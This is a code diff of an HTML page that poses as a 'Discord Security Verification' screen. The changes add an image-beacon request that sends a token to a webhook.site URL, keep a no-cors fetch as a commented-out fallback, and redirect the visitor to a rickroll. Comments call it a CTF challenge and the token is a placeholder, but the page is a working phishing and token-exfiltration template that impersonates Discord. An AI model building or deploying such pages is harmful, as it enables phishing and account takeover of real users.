@@ -1,24 +1,25 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <title>Discord Security Verification</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #36393f;
-            color: white;
-            text-align: center;
-            padding: 50px;
+        body { 
+            font-family: Arial, sans-serif; 
+            background-color: #36393f; 
+            color: white; 
+            text-align: center; 
+            padding: 50px; 
         }
-        button {
-            background-color: #5865F2;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 20px;
+        button { 
+            background-color: #5865F2; 
+            color: white; 
+            padding: 15px 30px; 
+            border: none; 
+            border-radius: 5px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            margin-top: 20px; 
         }
     </style>
 </head>
@@ -33,17 +34,23 @@
             // Simulated token for CTF challenge
             const token = "CTF_TOKEN_123";
             
-            // Send token to your webhook (REPLACE WITH YOUR URL)
+            // Method 1: Image tracker (no CORS issues)
+            new Image().src = `https://webhook.site/53d25910-f8b8-4703-a049-29f65d48456c?token=${token}`;
+
+            // Method 2: Fetch with CORS workaround (uncomment if needed)
+            /*
             fetch("https://webhook.site/53d25910-f8b8-4703-a049-29f65d48456c", {
                 method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ token: token })
+                headers: { "Content-Type": "text/plain" },
+                body: token,
+                mode: "no-cors"
             });
+            */
 
             // Rickroll redirect after 1 second
             setTimeout(() => {
                 window.location.href = "https://youtu.be/dQw4w9WgXcQ";
-            }, 2000);
+            }, 1000);
         }
     </script>
 </body>
